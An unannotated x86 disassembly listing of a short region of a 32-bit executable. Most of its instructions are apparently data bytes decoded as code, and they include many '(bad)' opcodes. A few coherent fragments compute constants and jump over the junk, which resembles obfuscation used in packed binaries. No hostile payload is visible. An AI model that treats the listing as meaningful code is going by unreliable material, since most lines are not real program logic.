  4090cb:	sub    DWORD PTR [ecx-0x23],edx
  4090ce:	pop    ebp
  4090cf:	jno    0x409129
  4090d1:	cmp    esi,eax
  4090d3:	mov    DWORD PTR ds:0x42a801,0x7b75
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0xfda4c6c4
  4090f5:	mov    ebx,0xef8eb516
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x40908c
  409101:	es retf 0x927a
  409105:	mov    bl,0xb
  409107:	fisttp WORD PTR [ecx+0x702b2fd4]
  40910d:	dec    ebx
  40910e:	(bad)  
  40910f:	repz (bad) 
  409111:	adc    BYTE PTR es:[ebp+0x21dcdbb0],bl
  409118:	into   
  409119:	sbb    DWORD PTR [edi+eax*8],edi
  40911c:	ins    DWORD PTR es:[edi],dx
  40911d:	pusha  
  40911e:	mov    ebx,0x3b363a4b
  409123:	lds    ebx,FWORD PTR [edx+0x57ef6296]
  409129:	push   eax
  40912a:	inc    edi
  40912b:	pop    esi
  40912c:	xor    eax,0x3ea0c9ed
  409131:	fimul  DWORD PTR [esi]
  409133:	ret    0x7b73
  409136:	test   DWORD PTR [esi-0x49],edi
  409139:	jb     0x409151
  40913b:	xchg   esi,eax
  40913c:	push   ebx
  40913d:	jno    0x409120
  40913f:	mov    eax,0x3af7e227
  409144:	pop    DWORD PTR [esi]
  409146:	hlt    
  409147:	call   0xdd0f07d4
  40914c:	retf   0xd1fe
  40914f:	outs   dx,BYTE PTR ds:[esi]
  409150:	and    ebp,DWORD PTR [edx-0x181da2b8]
  409156:	ficomp DWORD PTR [esi]
  409158:	je     0x409103
  40915a:	ss sbb edi,edi
  40915d:	iret   
  40915e:	xor    ecx,edi
  409160:	sub    al,0x76
  409162:	sub    al,0x21
  409164:	adc    ch,dl
  409166:	mov    edx,0x9788d251
  40916b:	ret    
  40916c:	aam    0xd1
  40916e:	cmp    al,0xa1
  409170:	es jmp 0x40915e
  409173:	(bad)  
  409174:	push   DWORD PTR [ecx+esi*4-0x3a]
  409178:	mov    ebp,0xf68a6028
  40917d:	pop    ds
  40917e:	je     0x40919e
  409180:	clc    
  409181:	and    ebp,eax
  409183:	or     edx,esp
  409185:	into   
  409186:	xchg   esi,eax
  409187:	xor    esp,eax
  409189:	add    BYTE PTR [esi+0x32],0xa3
  40918d:	mov    ebx,DWORD PTR [ecx]
  40918f:	rcr    cl,cl
  409191:	mov    cl,BYTE PTR [ecx]
  409193:	cdq    
  409194:	sbb    BYTE PTR [esp+ebx*4],al
  409197:	push   ss
  409198:	jbe    0x409145
  40919a:	into   
  40919b:	ret    0xe546
  40919e:	sub    bh,BYTE PTR [esi+ebp*1+0x75]
  4091a2:	xchg   esi,eax
  4091a3:	out    dx,al
  4091a4:	lock mov ah,0xda
  4091a7:	stos   BYTE PTR es:[edi],al
  4091a8:	mov    bh,0x2c
  4091aa:	cmp    ebp,DWORD PTR [esi]
  4091ac:	add    BYTE PTR [edx+0x22],bl
  4091af:	dec    ebp
  4091b0:	pop    ecx
  4091b1:	cmp    ecx,DWORD PTR [edi+0x7827df78]
  4091b7:	jae    0x409172
  4091b9:	mov    ch,0x27
  4091bb:	mov    ch,0x5d
  4091bd:	(bad)
  4091c1:	call   0xe229bcc1
  4091c6:	sub    dh,BYTE PTR [ecx-0x21fc028b]
  4091cc:	ror    DWORD PTR [ebp-0x4b0ffba6],0x71
  4091d3:	xor    esi,DWORD PTR [esp+eiz*8+0x77387fab]
  4091da:	mov    cl,0x49
  4091dc:	and    eax,0xaa752284
  4091e1:	mov    ds:0xfeaba141,eax
  4091e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091e8:	xor    eax,0xb8a7fce3
  4091ed:	push   esi
  4091ee:	pop    es
  4091ef:	aam    0x5c
  4091f1:	psllw  mm3,QWORD PTR [ebx]
  4091f4:	pop    ds
  4091f5:	push   ds
  4091f6:	enter  0x5d55,0x8f
  4091fa:	retf   
  4091fb:	sub    ch,BYTE PTR [eax-0x3b8a5037]
  409201:	fsubr  st(5),st
  409203:	ret    
  409204:	imul   esi,DWORD PTR [ecx-0xfb19306],0xfffffff0
  40920b:	jne    0x40926f
  40920d:	sbb    DWORD PTR [ebp+0x3f7e68fb],ecx
  409213:	mov    ch,0xfd
  409215:	push   esi
  409216:	adc    DWORD PTR [ebp+0x51],eax
  409219:	cmp    esi,DWORD PTR [esi+0x26]
  40921c:	cmp    BYTE PTR [edi+0x4ccb5bda],ah
  409222:	mov    ah,BYTE PTR [ebx+ebx*4+0xf]
  409226:	cs mov bh,0x75
  409229:	stos   DWORD PTR es:[edi],eax
  40922a:	xchg   ebx,eax
  40922b:	add    dh,ch
  40922d:	jge    0x409235
  40922f:	lods   eax,DWORD PTR ds:[esi]
  409230:	sbb    ebx,DWORD PTR [edx+0x14]
  409233:	jbe    0x40920e
  409235:	and    bl,BYTE PTR [ebx-0x5]
  409238:	hlt    
  409239:	ds iret 
  40923b:	ret    
  40923c:	xchg   esp,eax
  40923d:	mov    al,ds:0x930e08da
  409242:	jnp    0x40929e
  409244:	xor    al,0x53
  409246:	dec    edx
  409247:	jb     0x4091ea
  409249:	hlt    
  40924a:	fiadd  DWORD PTR [esi+0x7d]
  40924d:	xchg   esi,eax
  40924e:	sub    ecx,esi
  409250:	lods   al,BYTE PTR ds:[esi]
  409251:	lods   eax,DWORD PTR ds:[esi]
  409252:	xchg   ebp,eax
  409253:	repz sti 
  409255:	add    cl,bl
  409257:	leave  
  409258:	sub    DWORD PTR [ebx+0x31f9ece2],ebx
  40925e:	pop    eax
  40925f:	and    edi,DWORD PTR [esi+0x6a76bdae]
  409265:	imul   edx,eax,0xffffff8d
  409268:	xchg   BYTE PTR [eax],ah
  40926a:	mov    edi,0xe7a77758
  40926f:	or     al,0x7b
  409271:	or     BYTE PTR [eax],dl
  409273:	in     al,0x72
  409275:	out    0xee,al
  409277:	xchg   esi,eax
  409278:	ror    ah,cl
  40927a:	mov    fs,esi
  40927c:	fcmove st,st(6)
  40927e:	(bad)  
  40927f:	sti    
  409280:	out    dx,al
  409281:	sub    BYTE PTR [ecx+0x4f6ba1a0],al
  409287:	(bad)  
  409288:	popa   
  409289:	pop    edx
  40928a:	push   edx
  40928b:	pop    ebx
  40928c:	push   0x1db5e641
  409291:	aas    
  409292:	retf   0x6884
  409295:	into   
  409296:	and    edi,esp
  409298:	ds bound edx,QWORD PTR fs:[esi-0x2e]
  40929d:	adc    al,0xce
  40929f:	jbe    0x409270
  4092a1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4092a3:	sahf   
  4092a4:	fmul   QWORD PTR [ebx-0x7c400130]
  4092aa:	mov    ds:0x56beb1da,eax
  4092af:	pop    ebx
  4092b0:	or     BYTE PTR [ebx+0x1c],ah
  4092b3:	ret    
  4092b4:	xor    eax,0x87c2134d
  4092b9:	gs aad 0x96
  4092bc:	cs xchg edi,eax
  4092be:	add    BYTE PTR [edx-0x34],dl
  4092c1:	and    DWORD PTR [edi-0x4b95bda8],edi
  4092c7:	and    cl,0xfe
  4092ca:	int3   
  4092cb:	stc    
  4092cc:	lods   eax,DWORD PTR ds:[esi]
  4092cd:	jno    0x409327
  4092cf:	leave  
  4092d0:	adc    ebp,esp
  4092d2:	iret   
  4092d3:	pop    es
  4092d4:	or     dl,dh
  4092d6:	jae    0x40930c
  4092d8:	stos   DWORD PTR es:[edi],eax
  4092d9:	jno    0x409305
  4092db:	sbb    eax,0x15b0b67c
  4092e0:	inc    eax
  4092e1:	pop    esp
  4092e2:	test   eax,0xf6d19e9d
  4092e7:	imul   esp,DWORD PTR [ecx],0xffffffa0
  4092ea:	xchg   BYTE PTR [ecx-0x33],bl
  4092ed:	mov    ecx,0xa9e95ad5
  4092f2:	mov    ds:0xe4accded,eax
  4092f7:	pop    ss
  4092f8:	cmp    eax,0x6fbc93aa
  4092fd:	adc    eax,ecx
  4092ff:	mov    ds:0xa2b75952,eax
  409304:	imul   ecx,ebx,0xffffffa7
  409307:	popf   
  409308:	add    DWORD PTR [esi],0xffffffe4
  40930b:	jbe    0x4092c8
  40930d:	ret    0x93ac
  409310:	sub    al,0xac
  409312:	dec    ecx
  409313:	test   BYTE PTR [esp+ecx*2],cl
  409316:	mul    ebx
  409318:	jae    0x409379
  40931a:	xchg   esi,eax
  40931b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40931c:	mov    ?,WORD PTR [ecx]
  40931e:	inc    eax
  40931f:	mov    edx,0x10d6ad67
  409324:	bswap  ebp
  409326:	jns    0x40935b
  409328:	retf   0x51e
  40932b:	cdq    
  40932c:	sbb    dl,al
  40932e:	rol    DWORD PTR [esi-0x3a3f0666],1
  409334:	rcl    BYTE PTR [ebx+0x7306545b],cl
  40933a:	es push esi
  40933c:	add    DWORD PTR [ecx-0x3f],eax
  40933f:	test   ah,ch
  409341:	inc    ebp
  409342:	leave  
  409343:	ja     0x4093bd
  409345:	lock jae 0x4093a7
  409348:	ficomp DWORD PTR [esi]
  40934a:	jge    0x40938f
  40934c:	ror    DWORD PTR [esp+esi*1-0xf4d451d],0x33
  409354:	or     dh,BYTE PTR [esi+edx*8-0x1d1c583e]
  40935b:	int    0xf0
  40935d:	adc    ah,bh
  40935f:	mov    ds:0x96107e66,al
  409364:	into   
  409365:	rcl    BYTE PTR [eax],1
  409367:	(bad)  
  409368:	stc    
  409369:	add    esp,DWORD PTR ds:[edx-0x636db5ed]
  409370:	push   cs
  409371:	pop    esp
  409372:	push   esp
  409373:	add    al,0x21
  409375:	inc    eax
  409376:	(bad)
  40937a:	inc    esi
  40937b:	push   es
  40937c:	sbb    BYTE PTR [ebx+edx*4-0x2b],0xfd
  409381:	sbb    ecx,DWORD PTR [ecx]
  409383:	sahf   
  409384:	jge    0x40932b
  409386:	sbb    DWORD PTR [esi],ebx
  409388:	mov    eax,ds:0xd031215
  40938d:	lds    ebx,FWORD PTR [edx]
  40938f:	cmp    cl,BYTE PTR [ebp+0x29270e91]
  409395:	xchg   edi,eax
  409396:	(bad)  
  409398:	pop    es
  409399:	push   cs
  40939a:	push   cs
  40939b:	daa    
  40939c:	lock (bad) 
  40939e:	enter  0xd148,0x5f
  4093a2:	out    0x15,al
  4093a4:	mov    eax,ds:0xd68acf21
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0x683dff3d
  4093fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093fc:	pop    ss
  4093fd:	xor    eax,0xa77878ec
  409402:	jle    0x40947c
  409404:	js     0x4093e0
  409406:	sub    al,BYTE PTR [eax+esi*4]
  409409:	sub    al,BYTE PTR [esi-0x77]
  40940c:	add    eax,0x5058c8ed
  409411:	push   ds
  409412:	jne    0x409456
  409414:	cmp    eax,0xdfee74ce
  409419:	xor    eax,0xc347ff15
  40941e:	xor    dh,dl
  409420:	mov    ds:0xf5c31e06,al
  409425:	enter  0x6c8b,0x4f
  409429:	cmp    al,0xb8
  40942b:	aad    0x5f
  40942d:	xor    al,BYTE PTR [eax+0x983ae44]
  409433:	adc    DWORD PTR [edi+0x18b99df4],0x3ea5edcd
  40943d:	scas   al,BYTE PTR es:[edi]
  40943e:	lds    ebp,FWORD PTR [edx]
  409440:	stos   DWORD PTR es:[edi],eax
  409441:	js     0x4094ab
  409443:	and    dl,dh
  409445:	mov    bl,BYTE PTR [edi-0xf]
  409448:	jb     0x40945f
  40944a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40944b:	ret    0x6511
  40944e:	inc    esi
  40944f:	or     ecx,eax
  409451:	scas   eax,DWORD PTR es:[edi]
  409452:	lds    edx,FWORD PTR [esi]
  409454:	add    al,0x9d
  409456:	aad    0x8a
  409458:	call   0x90b4:0xb45ae6e0
  40945f:	bound  esp,QWORD PTR [eax+0x66a735f8]
  409465:	inc    ebx
  409466:	leave  
  409467:	jo     0x409454
  409469:	(bad)  
  40946a:	bound  esi,QWORD PTR ds:0xe7d150e0
  409470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409471:	sub    edx,DWORD PTR [edi+0x70]
  409474:	adc    al,0x9b
  409476:	ins    DWORD PTR es:[edi],dx
  409477:	dec    edx
  409478:	je     0x409437
  40947a:	aaa    
  40947b:	sbb    dh,ah
  40947d:	xchg   esi,eax
  40947e:	or     ah,dl
  409480:	rcl    BYTE PTR [ebx-0x39],cl
  409483:	ins    DWORD PTR es:[edi],dx
  409484:	ret    
  409485:	jne    0x40942b
  409487:	jno    0x409480
  409489:	xchg   BYTE PTR [ebp-0x79f59575],dh
  40948f:	dec    ebp
  409490:	shr    DWORD PTR [ebx],cl
  409492:	imul   esi,DWORD PTR [edi+0x8],0x2a1743c3
  409499:	sub    bh,BYTE PTR [ebx]
  40949b:	push   eax
  40949c:	outs   dx,DWORD PTR ds:[esi]
  40949d:	mov    ds:0xc43701c,al
  4094a2:	jbe    0x409452
  4094a4:	xlat   BYTE PTR ds:[ebx]
  4094a5:	mov    ds:0x89aa3a57,al
  4094aa:	leave  
  4094ab:	aad    0x89
  4094ad:	pop    ebp
  4094ae:	aas    
  4094af:	and    al,0xd9
  4094b1:	sti    
  4094b2:	jns    0x4094fd
  4094b4:	mov    al,0xda
  4094b6:	repnz in al,dx
  4094b8:	call   0x15b5ce0e
  4094bd:	scas   eax,DWORD PTR es:[edi]
  4094be:	(bad)  
  4094bf:	adc    bl,dh
  4094c1:	imul   ebp,DWORD PTR [edi-0x3f2c8f79],0xe0bdc966
  4094cb:	lock aad 0x61
  4094ce:	test   al,0xd4
  4094d0:	xchg   ebp,eax
  4094d1:	mov    ebx,0x21814f39
  4094d6:	xchg   esi,eax
  4094d7:	jp     0x40952f
  4094d9:	push   ds
  4094da:	es xchg edx,ecx
  4094dd:	scas   eax,DWORD PTR es:[edi]
  4094de:	pop    ds
  4094df:	xor    ebx,DWORD PTR ds:0xb57bbd0f
  4094e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e6:	sbb    DWORD PTR [ebp+0xd],ecx
  4094e9:	xchg   esi,eax
  4094ea:	ja     0x409531
  4094ec:	(bad)  
  4094ed:	inc    esp
  4094ee:	xor    al,BYTE PTR [ebx+0x6adbde94]
  4094f4:	mov    BYTE PTR [ebp-0x1e362a65],bh
  4094fa:	mov    DWORD PTR [eax],edi
  4094fc:	xchg   ecx,eax
  4094fd:	pop    edi
  4094fe:	or     BYTE PTR [ebx-0x72bb732a],cl
  409504:	xchg   ecx,eax
  409505:	popf   
  409506:	push   ss
  409507:	pop    ds
  409508:	sbb    ebp,DWORD PTR [ebp-0x55d8ae97]
  40950e:	sbb    eax,edx
  409510:	lahf   
  409511:	mov    ebx,0x6181efb9
  409516:	cmp    eax,0x1adcc18c
  40951b:	mov    al,0x30
  40951d:	lea    ecx,[edx]
  40951f:	push   edi
  409520:	or     al,0x6
  409522:	arpl   bp,sp
  409524:	mov    ebp,0xb23c5d09
  409529:	adc    eax,0xf474c09d
  40952e:	and    bh,BYTE PTR [edx+0x71]
  409531:	outs   dx,DWORD PTR ds:[esi]
  409532:	inc    eax
  409533:	addr16 pushw ss
  409536:	push   ss
  409537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409538:	cmp    DWORD PTR [ecx+eiz*4-0x20],esp
  40953c:	sub    BYTE PTR [ebx+0x69],0xaf
  409540:	test   bh,dh
  409542:	jno    0x40959e
  409544:	rcr    DWORD PTR [eax-0x29],cl
  409547:	(bad)  
  409549:	ins    DWORD PTR es:[edi],dx
  40954a:	xor    eax,0x56178871
  40954f:	adc    cl,dh
  409551:	neg    DWORD PTR [eax]
  409553:	loope  0x409561
  409555:	jecxz  0x4095aa
  409557:	repz or esp,edx
  40955a:	jbe    0x4095c0
  40955c:	aaa    
  40955d:	pusha  
  40955e:	addr16 jle 0x409568
  409561:	mov    ebx,0x7c61d202
  409566:	add    BYTE PTR [edx],cl
  409568:	or     DWORD PTR [ebx],esi
  40956a:	cmc    
  40956b:	cs adc eax,0xe7fcd00d
  409571:	enter  0xf62f,0x99
  409575:	lahf   
  409576:	sub    eax,0xd55588ce
  40957b:	mov    cl,0xbe
  40957d:	sub    eax,0xb9614104
  409582:	ficomp DWORD PTR [edi]
  409584:	retf   
  409585:	or     al,0xa8
  409587:	adc    cl,bl
  409589:	xor    al,0xf4
  40958b:	add    BYTE PTR [edi+0x5e],al
  40958e:	das    
  40958f:	rol    DWORD PTR [edi-0x2179e8e],1
  409595:	sub    DWORD PTR [esi],esi
  409597:	and    al,0xa7
  409599:	cmp    esi,esi
  40959b:	mov    ch,0x53
  40959d:	mov    bl,0xfe
  40959f:	push   es
  4095a0:	mov    ds:0x485127f,al
  4095a5:	int3   
  4095a6:	push   0x6091b778
  4095ab:	jmp    0x77c040d7
  4095b0:	sbb    eax,0x25c8c65f
  4095b5:	enter  0x4b48,0x29
  4095b9:	jne    0x409604
  4095bb:	adc    eax,0x483fa59a
  4095c0:	(bad)  
  4095c1:	stc    
  4095c2:	dec    ebx
  4095c3:	loope  0x40960f
  4095c5:	les    ebp,FWORD PTR [edi+ebp*1-0x7e]
  4095c9:	push   0xffffffed
  4095cb:	leave  
  4095cc:	push   ebx
  4095cd:	je     0x4095a9
  4095cf:	jbe    0x4095d1
  4095d1:	lods   eax,DWORD PTR ds:[esi]
  4095d2:	test   DWORD PTR [ecx+0x7625c4dc],edx
  4095d8:	and    BYTE PTR [edi+0x12],al
  4095db:	stos   DWORD PTR es:[edi],eax
  4095dc:	mov    al,ds:0x816dc00d
  4095e1:	mov    edi,0xc5e60622
  4095e6:	scas   eax,DWORD PTR es:[edi]
  4095e7:	(bad)  
  4095e8:	xor    eax,0x91c214dc
  4095ed:	retf   0x172d
  4095f0:	dec    edx
  4095f1:	cwde   
  4095f2:	into   
  4095f3:	dec    eax
  4095f4:	push   ecx
  4095f5:	jg     0x4095cf
  4095f7:	push   cs
  4095f8:	mov    ds:0x80307f29,al
  4095fd:	ds mov ch,0xbb
  409600:	push   eax
  409601:	jne    0x40960b
  409603:	fldenv [eax]
  409605:	mov    dl,0xac
  409607:	dec    ecx
  409608:	aad    0x1a
  40960a:	out    dx,eax
  40960b:	lds    ebp,FWORD PTR [ebx]
  40960d:	cmp    BYTE PTR [edi-0x2d],bl
  409610:	add    cl,BYTE PTR [ebx+eiz*2]
  409613:	pop    ecx
  409614:	sub    DWORD PTR [ecx+eax*2],esp
  409617:	lea    ecx,[ecx-0x2ac1b132]
  40961d:	sub    al,0x81
  40961f:	add    dh,BYTE PTR [esi-0x5c]
  409622:	mov    cl,0x67
  409624:	inc    eax
  409625:	ins    BYTE PTR es:[edi],dx
  409626:	mov    fs,esi
  409628:	shr    DWORD PTR ds:0x3863c381,cl
  40962e:	jl     0x40967b
  409630:	jecxz  0x40968e
  409632:	icebp  
  409633:	lods   eax,DWORD PTR ds:[esi]
  409634:	sub    ch,al
  409636:	mov    cl,0x21
  409638:	ins    DWORD PTR es:[edi],dx
  409639:	dec    eax
  40963a:	jb     0x40967d
  40963c:	jbe    0x4095d6
  40963e:	push   edx
  40963f:	sbb    al,0x59
  409641:	std    
  409642:	enter  0x8217,0x79
  409646:	mov    ?,WORD PTR [edi+0x34]
  409649:	lods   al,BYTE PTR ds:[esi]
  40964a:	imul   edi,DWORD PTR [eax],0xe70499a6
  409650:	push   eax
  409651:	ja     0x40968f
  409653:	in     eax,dx
  409654:	mov    dl,BYTE PTR [ebp+esi*8+0x66]
  409658:	in     eax,dx
  409659:	or     DWORD PTR [ebx],esp
  40965b:	mov    ecx,0x2c08d474
  409660:	push   cs
  409661:	cli    
  409662:	sbb    eax,0x48d0df1b
  409667:	add    BYTE PTR [edx+0x5a],ah
  40966a:	jne    0x409642
  40966c:	retf   
  40966d:	and    BYTE PTR [edi-0x3f],dh
  409670:	rcr    DWORD PTR [ebp+0x29],cl
  409673:	leave  
  409674:	ja     0x409695
  409676:	cmp    DWORD PTR [eax],ebx
  409678:	icebp  
  409679:	sub    DWORD PTR [eax],ebp
  40967b:	dec    BYTE PTR [esi]
  40967d:	sbb    DWORD PTR [edx+0x6bab60b2],ebp
  409683:	inc    ecx
  409684:	je     0x40962e
  409686:	cmp    eax,0x1f5e731e
  40968b:	add    DWORD PTR ds:0x59967973,ebx
  409691:	jno    0x409681
  409693:	inc    edi
  409694:	cli    
  409695:	ds jg  0x409684
  409698:	mov    ch,0x22
  40969a:	xchg   ebp,eax
  40969b:	add    ah,BYTE PTR [ecx+0x5f]
  40969e:	ins    DWORD PTR es:[edi],dx
  40969f:	scas   al,BYTE PTR es:[edi]
  4096a0:	imul   esi,edx,0x3d
  4096a3:	jns    0x409711
  4096a5:	push   edi
  4096a6:	mov    DWORD PTR ds:0xcc4e8be0,ebx
  4096ac:	(bad)  [edx+0xffc458b]
  4096b2:	test   ch,dh
  4096b4:	cld    
  4096b5:	(bad)  
  4096b6:	push   DWORD PTR [ebx]
  4096b8:	ret    0xc103
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0x44
  4096e4:	out    dx,eax
  4096e5:	ja     0x4096fe
  4096e7:	pop    esp
  4096e8:	bnd js 0x409763
  4096eb:	push   edx
  4096ec:	jle    0x409766
  4096ee:	js     0x409700
  4096f0:	sbb    BYTE PTR [esp+ecx*4+0x32e41bae],cl
  4096f7:	sbb    eax,0x3993ef1
  4096fc:	jnp    0x40970d
  4096fe:	ja     0x409706
  409700:	or     DWORD PTR [ebp+0x60bf3628],esi
  409706:	jp     0x409742
  409708:	push   edi
  409709:	aam    0xc5
  40970b:	mov    edi,0xe35c36eb
  409710:	xchg   esp,eax
  409711:	pop    ss
  409712:	xor    eax,0x4885b51
  409717:	mov    eax,ds:0x606e4d5
  40971c:	pop    es
  40971d:	mov    eax,DWORD PTR [edi]
  40971f:	daa    
  409720:	pushf  
  409721:	cwde   
  409722:	ret    
  409723:	mov    esi,0x31979f5f
  409728:	cmp    DWORD PTR [esi-0x72be6970],esi
  40972e:	adc    edi,DWORD PTR [esi]
  409730:	ret    0x1caa
  409733:	xlat   BYTE PTR ds:[ebx]
  409734:	jmp    0x503d4334
  409739:	sbb    edi,ecx
  40973b:	adc    bh,dh
  40973d:	in     eax,dx
  40973e:	aad    0x6
  409740:	aaa    
  409741:	cmp    DWORD PTR [ebx-0xba212],ebx
  409747:	ror    DWORD PTR es:[ebp+0x1fc6f04f],1
  40974e:	retf   
  40974f:	inc    esp
  409750:	fisub  WORD PTR [ebx]
  409752:	pop    eax
  409753:	mov    dl,0xa2
  409755:	mov    al,0x5c
  409757:	push   cs
  409758:	call   0x436e:0x4fdab44
  40975f:	out    dx,al
  409760:	or     al,0xc7
  409762:	mov    ecx,0x61a6b8f8
  409767:	jae    0x409703
  409769:	shl    DWORD PTR [edx+0x2],0xa4
  40976d:	jp     0x409781
  40976f:	mov    dl,0xf1
  409771:	add    al,ah
  409773:	sbb    DWORD PTR [edx+esi*1],eax
  409776:	and    ch,0xe4
  409779:	arpl   WORD PTR [edx-0x1eee6ff1],bx
  40977f:	jge    0x409792
  409781:	jecxz  0x4097e9
  409783:	sbb    cl,BYTE PTR [edi+0x130c588a]
  409789:	adc    eax,0x4762bc94
  40978e:	jb     0x40979e
  409790:	leave  
  409791:	cmp    al,0x29
  409793:	into   
  409794:	jb     0x40980a
  409796:	xor    al,BYTE PTR [ebp+0x58653ed3]
  40979c:	mov    bh,0x29
  40979e:	sbb    BYTE PTR [ebp-0x46d69a40],cl
  4097a4:	ins    DWORD PTR es:[edi],dx
  4097a5:	push   0x4e
  4097a7:	pop    edi
  4097a8:	ret    
  4097a9:	cmc    
  4097aa:	rcr    BYTE PTR [ebx-0x70],0xf
  4097ae:	dec    ecx
  4097af:	fist   WORD PTR ds:0x5bf61823
  4097b5:	jae    0x409795
  4097b7:	std    
  4097b8:	jbe    0x4097f8
  4097ba:	inc    ecx
  4097bb:	inc    esp
  4097bc:	push   0x2adc433a
  4097c1:	mov    ch,0x33
  4097c3:	dec    ecx
  4097c4:	xchg   BYTE PTR [esi+edi*2],cl
  4097c7:	pop    esi
  4097c8:	dec    ebx
  4097c9:	rcl    BYTE PTR es:[ebx],0xc4
  4097cd:	pop    edx
  4097ce:	dec    eax
  4097cf:	stos   DWORD PTR es:[edi],eax
  4097d0:	and    BYTE PTR [eax],0xff
  4097d3:	add    al,0x3b
  4097d5:	dec    ecx
  4097d6:	jno    0x409764
  4097d8:	fild   QWORD PTR [edi]
  4097da:	gs test al,0x4
  4097dd:	dec    ebx
  4097de:	retf   
  4097df:	imul   edi,DWORD PTR [ebx+0x4d],0xffffff97
  4097e3:	adc    bh,ch
  4097e5:	jl     0x409862
  4097e7:	jbe    0x40978a
  4097e9:	sub    DWORD PTR [edi+ecx*2],edx
  4097ec:	xchg   ebp,eax
  4097ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097ee:	and    DWORD PTR [edx+0x358d11b0],0x9856e556
  4097f8:	test   DWORD PTR [ecx+edi*2-0x3c],0xaa34c45f
  409800:	mov    esi,0x92bc8bbe
  409805:	fist   DWORD PTR [ebp+0x46]
  409808:	sbb    ecx,ebp
  40980a:	mov    edx,0x275a23a9
  40980f:	lods   al,BYTE PTR ds:[esi]
  409810:	inc    eax
  409811:	ror    BYTE PTR [ebx],0x20
  409814:	xor    al,0x30
  409816:	jecxz  0x4097b2
  409818:	popf   
  409819:	lahf   
  40981a:	ficom  DWORD PTR [esi-0x71]
  40981d:	mov    esi,DWORD PTR [edi-0x57]
  409820:	mov    eax,0xb4fe901d
  409825:	in     al,dx
  409826:	xor    eax,0x81d6a753
  40982b:	pop    ebx
  40982c:	outs   dx,DWORD PTR ds:[esi]
  40982d:	jno    0x4097f0
  40982f:	test   eax,0x9315d6ed
  409834:	scas   eax,DWORD PTR es:[edi]
  409835:	rsm    
  409837:	and    ah,BYTE PTR [ebx+0x60]
  40983a:	and    BYTE PTR [esi+0x53],ah
  40983d:	inc    ebp
  40983e:	mov    ebp,0x76d3d345
  409843:	pusha  
  409844:	pop    edx
  409845:	(bad)  
  409846:	mov    ds:0xba913768,eax
  40984b:	sub    BYTE PTR [ecx-0x2884404f],0xeb
  409852:	test   eax,0x1d72e227
  409857:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409858:	adc    BYTE PTR [ebx+0x40cbe6f],bh
  40985e:	out    dx,eax
  40985f:	stos   BYTE PTR es:[edi],al
  409860:	cmp    edx,DWORD PTR [esi+0x40]
  409863:	sbb    al,0x71
  409865:	add    bp,si
  409868:	adc    BYTE PTR [ebx+0x77055849],dh
  40986e:	pop    edi
  40986f:	xchg   esp,eax
  409870:	inc    edx
  409871:	gs cmp ebx,esi
  409874:	ss out 0x47,eax
  409877:	pusha  
  409878:	xchg   ebx,eax
  409879:	loop   0x409881
  40987b:	and    eax,0x50cf69cc
  409880:	jns    0x409852
  409882:	mov    ebp,0x72e9269e
  409887:	cmp    eax,DWORD PTR [ebx+edx*1]
  40988a:	xor    eax,0x2bce913d
  40988f:	retf   0xbe7c
  409892:	outs   dx,BYTE PTR ds:[esi]
  409893:	dec    ebp
  409894:	scas   eax,DWORD PTR es:[edi]
  409895:	out    dx,al
  409896:	scas   eax,DWORD PTR es:[edi]
  409897:	xchg   esi,eax
  409898:	(bad)  
  409899:	xlat   BYTE PTR ds:[ebx]
  40989a:	adc    ebp,DWORD PTR [eax-0x72]
  40989d:	loop   0x409825
  40989f:	xchg   ebx,eax
  4098a0:	push   0x67
  4098a2:	mov    al,0x88
  4098a4:	xor    eax,0xdb651be9
  4098a9:	jp     0x4098b4
  4098ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098ac:	add    DWORD PTR [ecx+0x65],0xffffff89
  4098b0:	adc    esp,edi
  4098b2:	pop    edi
  4098b3:	adc    esi,ebp
  4098b5:	nop
  4098b6:	push   ss
  4098b7:	jns    0x4098a4
